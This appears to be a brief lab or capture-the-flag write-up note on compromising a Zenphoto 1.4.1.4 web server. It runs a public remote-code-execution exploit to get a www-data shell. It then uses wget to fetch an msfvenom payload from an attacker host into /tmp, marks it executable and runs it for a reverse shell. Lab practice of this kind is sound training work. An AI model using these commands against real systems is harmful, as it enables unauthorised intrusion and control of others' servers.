# 4 :80 zenphoto 1.4.1.4

```
Using https://www.exploit-db.com/exploits/18083

$ php 18083.php 192.168.159.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
offsecsrv
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux

# shell is bad.
# using msfvenom elf to get shell back
zenphoto-shell# wget 192.168.49.159/kashz -O /tmp/kashz
zenphoto-shell# chmod +x /tmp/kashz
zenphoto-shell# /tmp/kashz
```
